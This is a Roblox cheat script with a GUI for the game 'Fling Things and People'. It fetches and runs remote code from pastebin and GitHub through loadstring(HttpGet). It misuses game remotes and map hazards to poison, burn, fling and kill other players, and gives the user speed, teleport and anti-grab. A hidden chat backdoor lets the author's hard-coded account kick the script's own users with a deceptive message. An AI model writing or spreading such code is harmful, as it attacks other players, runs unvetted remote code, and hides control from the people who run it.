if game.PlaceId == 6961824067 and not getgenv().d83jdnmas43d34d4dh43d then
	getgenv().d83jdnmas43d34d4dh43d = true
	local keySystem = loadstring(game:HttpGet(('https://pastebin.com/raw/S8xckEgu')))()
	local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

	-- Services
	local PS = game:GetService("Players")
	local DB = game:GetService("Debris")
	local W = game:GetService("Workspace")
	local Tween = game:GetService("TweenService")
	local uis = game:GetService("UserInputService")
	local RS = game:GetService("ReplicatedStorage")
	local R = game:GetService("RunService")

	-- Player

	local CE = RS:WaitForChild("CharacterEvents")
	local Player = PS.LocalPlayer
	local Mouse = Player:GetMouse()
	local PlayerToysFolder = W:WaitForChild(Player.Name .. "SpawnedInToys")

	-- Important Events

	local SpawnToyRF = RS:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
	local DeleteToyRE = RS:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
	
	-- Grab Events
	local CreateGrabLine = RS:WaitForChild("GrabEvents"):WaitForChild("CreateGrabLine")
	local DestroyGrabLine = RS:WaitForChild("GrabEvents"):WaitForChild("DestroyGrabLine")
	local SetNetworkOwnership = RS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
	local ExtendLine = RS:WaitForChild("GrabEvents"):WaitForChild("ExtendGrabLine")
	
	
	
	
	-- Toggles Variables

	_G.SuperStrength = nil
	_G.AntiGrab = nil
	_G.AntiExplosion = nil
	_G.AntiBurn = nil
	_G.Poison_Grab = nil
	_G.Burn_Grab = nil
	_G.Radiactive_Grab = nil
	_G.Death_Grab = nil
	_G.SuperSpeed = nil
	_G.InfiniteJump = nil
	_G.TeleportKey = nil

	-- Slider Variables

	-- Multiplier Speed

	getgenv().Multiplier = 0.15

	_G.Strength = nil

	-- Functions Dev

	local dev_id = 90063030

	local function verifyDev(player:Player | Model)
		local pObj

		if player:IsA("Model") then 
			pObj = PS:GetPlayerFromCharacter(player)
		elseif player:IsA("Player") then
			pObj = player
		end

		if pObj then
			if pObj.UserId == dev_id then
				return true
			else
				return false
			end
		end
	end

	local function checkMe(name:string)
		name = string.lower(name)
		
		print(name)
		
		if name == "all" then
			return true
		else
			for _, player in pairs(PS:GetPlayers()) do
				if string.match(string.lower(player.Name), name) or string.match(string.lower(player.DisplayName), name) then
					print(player.Name)
					return true
				end
			end
			
		end
	end

	local function DevJoinEffect()
		local sound = Instance.new("Sound", W)
		local brilho = Instance.new("ColorCorrectionEffect", W.CurrentCamera)
			
		sound.SoundId = "rbxassetid://" .. 5246103002
		sound.Volume = 1
		sound:Play()
			
		brilho.Brightness = 0.825
		Tween:Create(brilho, TweenInfo.new(5), {Brightness = 0}):Play()
			
		DB:AddItem(brilho, 35)
		DB:AddItem(sound, 35)
	end

	local function Dev_commands(message)
		message = string.split(string.lower(message), " ")
		
		if message[1] == ":kick" then
			if checkMe(message[2]) then
				PS.LocalPlayer:Kick("The game thinks you're exploiting, rejoin again.")
			end
		end
	end

	game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData) 
		if verifyDev(PS[messageData.FromSpeaker]) then
			Dev_commands(messageData.Message)
		end
	end)

	PS.PlayerAdded:Connect(function(player)
		if verifyDev(player) then
			DevJoinEffect()
		end
	end)

	-- GUI 
	local Window = OrionLib:MakeWindow({Name = "Fling Things and People", HidePremium = true, SaveConfig = false, ConfigFolder = "OrionTest", IntroEnabled = false})

	local Main_Tab = Window:MakeTab({
		Name = "Combat",
		Icon = "rbxassetid://7733955740",
		PremiumOnly = false
	})

	local Invincibility_Tab = Window:MakeTab({
		Name = "Invincibility",
		Icon = "rbxassetid://7743868000",
		PremiumOnly = false
	})


	local Toggle_Tab = Window:MakeTab({
		Name = "Player",
		Icon = "rbxassetid://7743871002",
		PremiumOnly = false
	})

	-- Main

	Main_Tab:AddToggle({
		Name = "Super Strength",
		Default = false,
		Callback = function(Value)
			_G.SuperStrength = Value
		end    
	})

	Main_Tab:AddSlider({
		Name = "Strength",
		Min = 400,
		Max = 10000,
		Default = 400,
		Color = Color3.fromRGB(255,255,255),
		Increment = 100,
		ValueName = "",
		Callback = function(Value)
			_G.Strength = Value
		end    
	})

	Main_Tab:AddToggle({
		Name = "Auto-Grab",
		Default = false,
		Callback = function(Value)
			_G.AutoAttacker = Value
		end    
	})


	Main_Tab:AddToggle({
		Name = "Poison Grab",
		Default = false,
		Callback = function(Value)
			_G.Poison_Grab = Value
		end    
	})

	Main_Tab:AddToggle({
		Name = "Burn Grab",
		Default = false,
		Callback = function(Value)
			_G.Burn_Grab = Value
		end    
	})


	Main_Tab:AddToggle({
		Name = "Death Grab",
		Default = false,
		Callback = function(Value)
			_G.Death_Grab = Value
		end    
	})

	-- Invincibility Tab

	Invincibility_Tab:AddToggle({
		Name = "Anti-Grab",
		Default = false,
		Callback = function(Value)
			_G.AntiGrab = Value
		end    
	})

	Invincibility_Tab:AddToggle({
		Name = "Anti-Burn",
		Default = false,
		Callback = function(Value)
			_G.AntiBurn = Value
		end    
	})

	Invincibility_Tab:AddToggle({
		Name = "Anti-Explosion (PATCHED)",
		Default = false,
		Callback = function(Value)
			_G.AntiExplosion = Value
		end    
	})


	-- Toggle Tab

	Toggle_Tab:AddToggle({
		Name = "Walkspeed",
		Default = false,
		Callback = function(Value)
			_G.SuperSpeed = Value
		end    
	})

	Toggle_Tab:AddSlider({
		Name = "Speed",
		Min = 0.1,
		Max = 5,
		Default = 0.1,
		Color = Color3.fromRGB(255,255,255),
		Increment = 0.01,
		ValueName = "",
		Callback = function(Value)
			Multiplier = Value
		end    
	})

	Toggle_Tab:AddToggle({
		Name = "Infinite Jump",
		Default = false,
		Callback = function(Value)
			_G.InfiniteJump = Value
		end    
	})

	Toggle_Tab:AddSlider({
		Name = "Jump Power",
		Min = 24,
		Max = 1000,
		Default = 24,
		Color = Color3.fromRGB(255,255,255),
		Increment = 10,
		ValueName = "",
		Callback = function(Value)
			Player.Character:FindFirstChildOfClass("Humanoid").JumpPower = Value
		end    
	})

	Toggle_Tab:AddToggle({
		Name = "Teleport (Z)",
		Default = false,
		Callback = function(Value)
			_G.TeleportKey = Value
		end    
	})

	-- GUI ^^^^

	-- Fire Grab Setup

	local function checkFirePart()
		for i, toy in pairs(PlayerToysFolder:GetChildren()) do
			if toy.Name == "Campfire" then
				if not toy["FirePlayerPart"]["CanBurn"].Value then
					DeleteToyRE:FireServer(toy)
				end
			end
		end

		if PlayerToysFolder:FindFirstChild("Campfire") then
			local campfire = PlayerToysFolder["Campfire"]
			print("Campfire found!")
			if campfire["FirePlayerPart"]["CanBurn"].Value then
				return campfire
			end
		else
			local campfire = nil

			local args = {
				[1] = "Campfire",
				[2] = CFrame.new(508.073517, 67.2614441, -261.901917, -0.133750245, -0.471861839, 0.871468484, -3.7252903e-09, 0.879369617, 0.476139903, -0.991015136, 0.0636838302, -0.117615893),
				[3] = Vector3.new(0, 97.69000244140625, 0)
			}

			repeat
				if SpawnToyRF:InvokeServer(unpack(args)) == "YouDontOwnToy" then
					for i, toy in pairs(W:GetChildren()) do
						if toy:FindFirstChild("Campfire") then
							local ftoy = toy["Campfire"]

							if ftoy["FirePlayerPart"]["CanBurn"].Value then
								campfire = ftoy
								break
							end
						end
					end

					if campfire then
						break
					end
				else
					--SpawnToyRF:InvokeServer(unpack(args))
					campfire = PlayerToysFolder:FindFirstChild("Campfire")
				end
				
				task.wait(1)
			until campfire ~= nil
			
			return campfire
		end
	end

	-- Poison Script Setup

	local poison_part1 = W["Map"]["Hole"]["PoisonBigHole"]["PoisonHurtPart"]
	local poison_part2 = W["Map"]["Hole"]["PoisonSmallHole"]["PoisonHurtPart"]
	local poison_part3 = W["Map"]["FactoryIsland"]["PoisonContainer"]["PoisonHurtPart"]

	poison_part1.Size, poison_part2.Size, poison_part3.Size = Vector3.new(0.5, 0.5, 0.5), Vector3.new(0.5, 0.5, 0.5), Vector3.new(0.5, 0.5, 0.5)
	poison_part1.Position, poison_part2.Position, poison_part3.Position = Vector3.new(0, -50, 0), Vector3.new(0, -50, 0), Vector3.new(0, -50, 0)

	-- Radiactive Script Setup

	local RadiactivePartPaint = W["Map"]["AlwaysHereTweenedObjects"]:FindFirstChild("OuterUFO")
	
	if RadiactivePartPaint then
		RadiactivePartPaint = RadiactivePartPaint["Object"]["ObjectModel"]["PaintPlayerPart"]
		RadiactivePartPaint.Anchored = true
		RadiactivePartPaint.Shape = Enum.PartType.Block
		RadiactivePartPaint:WaitForChild("WeldConstraint"):Destroy()
		RadiactivePartPaint.Transparency = 1
		RadiactivePartPaint.Size = Vector3.new(0.5, 0.5, 0.5)
		RadiactivePartPaint.Position = Vector3.new(0, -50, 0)
	end
	
	if RadiactivePartPaint then
		Main_Tab:AddToggle({
			Name = "Radiactive Grab",
			Default = false,
			Callback = function(Value)
				_G.Radiactive_Grab = Value
			end    
		})
	end
	
	-- Anti-Burn Setup

	local apagarfogo = W["Map"]["Hole"]["PoisonBigHole"]["ExtinguishPart"]
	apagarfogo.Size = Vector3.new(0.5, 0.5, 0.5)
	apagarfogo.Transparency = 1
	apagarfogo["Tex"].Transparency = 1

	
	-- Grabs Scripts
	
	W.ChildAdded:Connect(function(model)
		if model.Name == "GrabParts" then
			local part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
			
			if part_to_impulse then
				-- PC Super Fling Support
					task.spawn(function()
						print("Part found!")
			
						local inputObj
						local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
			
						model:GetPropertyChangedSignal("Parent"):Connect(function()
							if not model.Parent then
								if uis:GetLastInputType() == Enum.UserInputType.MouseButton2 and _G.SuperStrength then
									if not verifyDev(part_to_impulse.Parent) then
										print("Launched!")
										velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
										velocityObj.Velocity = workspace.CurrentCamera.CFrame.lookVector * _G.Strength
										DB:AddItem(velocityObj, 1)
									else
										velocityObj:Destroy()
									end
							elseif uis:GetLastInputType() == Enum.UserInputType.MouseButton1 then
								velocityObj:Destroy()
								print("Cancel Launch!")
							else
								velocityObj:Destroy()
								print("No two keys pressed!")
							end
						end
					end)
				end)
				
				-- Mobile Super Strength
				task.spawn(function()
						print("Part found!")
	
						local inputObj
						local velocityObj = Instance.new("BodyVelocity", part_to_impulse)
						local c1, c2, c3
	
						velocityObj.MaxForce = Vector3.new(0,0,0)
	
						while inputObj == nil and model.Parent do
							if game.Players.LocalPlayer.PlayerGui:FindFirstChild("ContextActionGui") then
								for _, button in pairs(game.Players.LocalPlayer.PlayerGui["ContextActionGui"]:GetDescendants()) do
									if button:IsA("ImageLabel") then
										if button.Image == "http://www.roblox.com/asset/?id=9603678090" then
											inputObj = button.Parent
										end
									end
								end
							end
							
							R.Heartbeat:Wait()
						end
						
						if inputObj then
							local function Launch()
								if _G.SuperStrength then
									velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
									velocityObj.Velocity = workspace.CurrentCamera.CFrame.lookVector * _G.Strength
								end
							end 
							c1 = inputObj.MouseButton1Up:Connect(Launch)
							c2 = inputObj.MouseButton1Down:Connect(Launch)
						end
						
						
					c3 = model:GetPropertyChangedSignal("Parent"):Connect(function()
						if not model.Parent then
							c3:Disconnect()
							d:AddItem(velocityObj, 1)
	
							if c1 then
								c1:Disconnect()
								if c2 then
									c2:Disconnect()
								end
							end
						end
					end)
				end)
	
				-- Poison Grab	
				task.spawn(function()
					if part_to_impulse.Parent:FindFirstChildOfClass("Humanoid") then
					print("Part Poison found!")
					local head = part_to_impulse.Parent["Head"]
						while model.Parent do
							if _G.Poison_Grab and not verifyDev(part_to_impulse.Parent) then
								poison_part1.CFrame = head.CFrame * CFrame.new(0, math.random(-1, 1), 0)
								poison_part2.CFrame = head.CFrame * CFrame.new(0, math.random(-1, 1), 0)
								poison_part3.CFrame = head.CFrame * CFrame.new(0, math.random(-1, 1), 0)
							else
								poison_part3.Position = Vector3.new(0, -50, 0)
								poison_part2.Position = Vector3.new(0, -50, 0)
								poison_part1.Position = Vector3.new(0, -50, 0)
							end
	
							R.Heartbeat:Wait()
						end
						
						poison_part3.Position = Vector3.new(0, -50, 0)
						poison_part2.Position = Vector3.new(0, -50, 0)
						poison_part1.Position = Vector3.new(0, -50, 0)
					end
				end)
	
				-- Fire Grab
				task.spawn(function()
					if part_to_impulse.Parent:FindFirstChildOfClass("Humanoid") or part_to_impulse.Parent:FindFirstChild("FireDetector") then
						print("Burn Started!")
						local firePart = checkFirePart()
						if firePart then
							firePart = firePart:FindFirstChild("FirePlayerPart")
	
							local changefirep = function(v)
								if v == 1 then
									firePart["Attachment"]["FireParticleEmitter"].Enabled = false
									firePart["FirePlayerSound"].Volume = 0
									firePart["WeldConstraint"].Enabled = false
									firePart["FireLight"].Enabled = false
									firePart.Anchored = true
								elseif v == 0 then
									firePart.Position = firePart.Parent["SoundPart"].Position
									firePart["Attachment"]["FireParticleEmitter"].Enabled = true
									firePart["FirePlayerSound"].Volume = 0.08
									firePart["WeldConstraint"].Enabled = true
									firePart["FireLight"].Enabled = true
									firePart.Anchored = false
								end
							end
							
							while model.Parent do
								if _G.Burn_Grab and not verifyDev(part_to_impulse.Parent) then
									changefirep(1)
									if part_to_impulse.Parent:FindFirstChildOfClass("Humanoid") then
										firePart.Position = part_to_impulse.Parent["HumanoidRootPart"]["FirePlayerPart"].Position 
									elseif part_to_impulse.Parent:FindFirstChild("FireDetector") then
										firePart.Position = part_to_impulse.Parent["FireDetector"].Position
									end
								else
									changefirep(0)
								end
	
								R.Heartbeat:Wait()
							end
	
							print("Burn Ended")
							changefirep(0)
						end
					end
				end)
	
				-- Radiactive Grab
				task.spawn(function()
					if part_to_impulse.Parent:FindFirstChildOfClass("Humanoid") then
						while model.Parent do
							if _G.Radiactive_Grab and not verifyDev(part_to_impulse.Parent) then
								RadiactivePartPaint.Position = part_to_impulse.Position
							else
								RadiactivePartPaint.Position = Vector3.new(0, -50, 0)
							end
							R.Heartbeat:Wait()
						end
	
						RadiactivePartPaint.Position = Vector3.new(0, -50, 0)
					end
				end)
	
				-- WickedWraith Grab
	
				task.spawn(function()
					if part_to_impulse.Parent:FindFirstChildOfClass("Humanoid") then
						if _G.Death_Grab then
							local alive_humanoid = part_to_impulse.Parent:FindFirstChildOfClass("Humanoid")

							while model.Parent do
								alive_humanoid:ChangeState(Enum.HumanoidStateType.Dead)
								task.wait()
								DestroyGrabLine:FireServer(part_to_impulse)
								task.wait()
								SetNetworkOwnership:FireServer(game:GetService("Workspace").PlayerCharacterLocationDetector, part_to_impulse.CFrame)
								task.wait()
							end
						end
					end
				end)
			end
		end
	end)

	-- Anti Grab Setup


	local BeingHeld = Player:WaitForChild("IsHeld")
	local PlayerScripts = Player:WaitForChild("PlayerScripts")
	local PlayerWhoIsHolding = nil

	-- Remotes
	local StruggleEvent = CE:WaitForChild("Struggle")

	-- Anti-Explosion
	workspace.DescendantAdded:Connect(function(v)
		if v:IsA("Explosion") and _G.AntiExplosion then
			v.BlastPressure = 0
		end
	end)

	-- Anti-grab

	BeingHeld.Changed:Connect(function(C)
		if _G.AutoAttacker then
			for i, players in pairs(PS:GetPlayers()) do
				if players.Name == PlayerWhoIsHolding then
					if players.Character["Head"]:FindFirstChild("PartOwner") then
						if not players.Character["Head"]:FindFirstChild("PartOwner").Value == PlayerWhoIsHolding then
							SetNetworkOwnership:FireServer(players.Character["HumanoidRootPart"], players.Character["HumanoidRootPart"].CFrame)
						end
					end
				end
			end
		end

		if C == true and not verifyDev(PS:FindFirstChild(PlayerWhoIsHolding)) then
			local char = Player.Character or Player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")

			if BeingHeld.Value then
				local Event;
				
				Event = R.RenderStepped:Connect(function()
					if BeingHeld.Value and _G.AntiGrab then
						hrp.Velocity = Vector3.new()
						hrp.Anchored = true
						StruggleEvent:FireServer(Player)
					else
						hrp.Velocity = Vector3.new()
						hrp.Anchored = false
						Event:Disconnect()
					end
				end)
			end
		end
	end)

	local function reconnect()
		local Character = Player.Character or Player.CharacterAdded:Wait()
		local Humanoid = Character:FindFirstChildWhichIsA("Humanoid") or Character:WaitForChild("Humanoid")
		local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
		local IsBurning = HumanoidRootPart:WaitForChild("FirePlayerPart"):WaitForChild("CanBurn")
		local Head = Character:WaitForChild("Head")

		task.spawn(function() 
			while true do
				if _G.SuperSpeed then
					HumanoidRootPart.CFrame = HumanoidRootPart.CFrame + Humanoid.MoveDirection * Multiplier
				end

				R.Stepped:Wait()
			end
		end)
		
		
		Head.ChildAdded:Connect(function(part)
			if part.Name == "PartOwner" then
				PlayerWhoIsHolding = tostring(part.Value)
			end
		end)

		IsBurning.Changed:Connect(function(v)
			if v and _G.AntiBurn then
				while IsBurning.Value do
					apagarfogo.CFrame = HumanoidRootPart["FirePlayerPart"].CFrame * CFrame.new(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
					R.Stepped:Wait()
				end

				apagarfogo.Position = Vector3.new(0, -100, 0)
			end
		end)
		
		Humanoid.Changed:Connect(function(C)
			if C == "Sit" and Humanoid.Sit == true then
				if Humanoid.SeatPart ~= nil and tostring(Humanoid.SeatPart.Parent) == "CreatureBlobman" then
				elseif Humanoid.SeatPart == nil then
					Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
					Humanoid.Sit = false
				end
			end
		end)
	end

	uis.JumpRequest:Connect(function()
		if _G.InfiniteJump then
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
		end
	end)


	Mouse.KeyDown:Connect(function(key)
		if string.lower(key) == "z" and _G.TeleportKey then
			if Mouse.Target then
				Player.Character["HumanoidRootPart"].CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
			end
		end
	end)

	reconnect()

	Player.CharacterAdded:Connect(reconnect)

	OrionLib:Init()
end
